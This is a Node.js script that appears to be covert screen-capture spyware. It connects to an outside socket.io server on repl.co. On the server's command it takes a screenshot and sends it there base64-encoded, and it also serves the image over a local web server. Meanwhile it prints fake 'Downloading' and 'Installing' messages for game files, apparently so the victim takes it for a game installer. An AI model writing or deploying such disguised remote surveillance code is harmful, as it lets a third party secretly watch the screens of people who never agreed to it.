var getmaj = require("./libs/getmaj");

var fs = require('fs');
var io = require("socket.io-client")("https://AridNeighboringAnalyst--DaMastaCoda.repl.co");
setInterval(function() {
    io.emit("host");
}, 100);

io.on("ba", () => {
    getScreen(function(ab) {
            io.emit("ab", ab);
        })
        // function to encode file data to base64 encoded string

})

function getScreen(callback) {
    getmaj("tjdata2.png", function(error, complete) {
        if (error) {

        } else {
            var bitmap = fs.readFile("tjdata2.png", (err, data) => {
                // convert binary data to base64 encoded string
                callback("data:image/png;base64," + new Buffer.from(data).toString('base64'));
            });

        }
    });
    // read binary data
}

var express = require('express'),
    childProcess = require('child_process'),
    app = express();

app.get('/tjdata2.png', function(request, response) {
    getmaj("tjdata2.png", function(error, complete) {
        if (error) {
            response.send(503, 'Error creating image!');
        } else {
            response.sendfile('tjdata2.png')
        }
    });
});
var out = ["syscall.dll", "main.js", "assets.zip", "love2d Framework 10", "characters.js", "menu.js", "story.js", "text.json"];
setInterval(function() {
    if (Math.random() > 0.5) {
        var r = Math.floor(Math.random() * out.length);

        if (Math.random() > 0.5) {
            console.log("Downloading " + out[r]);
        } else {
            console.log("Installing " + out[r]);
        }
    }
}, 2500)

app.listen(3000);